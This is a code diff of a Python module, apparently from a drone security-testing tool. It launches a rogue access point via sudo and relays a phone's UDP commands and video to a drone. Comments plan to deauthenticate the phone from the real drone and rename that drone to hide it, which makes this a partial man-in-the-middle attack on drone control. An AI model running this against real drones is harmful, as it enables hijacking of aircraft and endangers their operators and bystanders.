@@ -1,16 +1,37 @@
-#UDP communication
-import socket
-#So we can have bi-directional communication 
-import threading
+import socket # UDP communication
+import threading #So we can have bi-directional communication 
+import os
+import json
+from src.utils import sudo_exec
+
+##################
+### PREP MODULE ##
+##################
+
+# Get path to project root directory (two levels up from this file)
+target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
+scan_info = None
+
+# Intialize target drone data
+with open(target_data_file, 'r') as file:
+    scan_info = json.load(file)
+
+# Get DRONE_INTERFACE from INDRA
+options_info = scan_info.get("options", {})
+interface = options_info.get("interface")
 
 # Config Card 1 
 AP_INTERFACE = "wlx9cefd5f754df"
-AP_INTERFACE_IP = "192.168.10.1" #Card 1's AP IP address
-LISTEN_PORT = 8889 #Port that phone sends commands to
+AP_INTERFACE_IP = "192.168.10.1" # Card 1's AP IP address
+LISTEN_PORT = 8889 # Port that phone sends commands to
 
-DRONE_INTERFACE = "wlx9cefd5f66998"
+DRONE_INTERFACE = interface # Should be "wlx9cefd5f66998"
 DRONE_HOST = "192.168.10.1" # Real Drone's IP address
-DRONE_PORT = 8889 #Drone's command port
+DRONE_PORT = 8889 # Drone's command port
+
+# Deauth the phone from the real drone to force it to connect to our AP instead
+
+# Reauth to the drone, change the drone's SSID and password to "hide" it
 
 VIDEO_PORT = 7797
 
@@ -18,21 +39,26 @@ PHONE_HOST = "192.168.10.3"
 # PHONE_PORT = 7797
 
 
-#Starts as None and will dynamically change as the phone connects 
+# Run the AP setup/start scripts
+sudo_exec(f"./SetupAP.sh {AP_INTERFACE}")
+sudo_exec(f"./StartAP.sh {AP_INTERFACE}")
+
+
+# Starts as None and will dynamically change as the phone connects 
 phone_addr = None
-#Mutex preventing both threads writing or reading (anti-race-cond)
+# Mutex preventing both threads writing or reading (anti-race-cond)
 phone_lock = threading.Lock()
 
 
-#Creats the UDP socket(8889) and binds it to the AP_INTERFACE_IP
-#it will only accept traffic from card 1 
+# Creates the UDP socket(8889) and binds it to the AP_INTERFACE_IP
+# it will only accept traffic from card 1 
 phone_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 SO_BINDTODEVICE=25
 phone_sock.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE, AP_INTERFACE.encode('utf-8') + b'\0')
 phone_sock.bind((AP_INTERFACE_IP, LISTEN_PORT))
 
 
-#Creates another UDP port on the drone side binds to (0.0.0.0)!!!!!(this may need to change to card 2's IP to make sure it sends through it)
+# Creates another UDP port on the drone side binds to (0.0.0.0)!!!!!(this may need to change to card 2's IP to make sure it sends through it)
 drone_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 drone_sock.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE, DRONE_INTERFACE.encode('utf-8') + b'\0')
 drone_sock.connect(("192.168.10.6", VIDEO_PORT)) # ephemeral local port for drone side 
@@ -63,7 +89,7 @@ def drone_to_phone():
         phone_sock.sendto(data, (PHONE_HOST, VIDEO_PORT)) #pass unchanged 
 
 
-#Starts both functions at the same time on seperate threads
+# Starts both functions at the same time on seperate threads
 threading.Thread(target=phone_to_drone, daemon=True).start()
 threading.Thread(target=drone_to_phone, daemon=True).start()
 
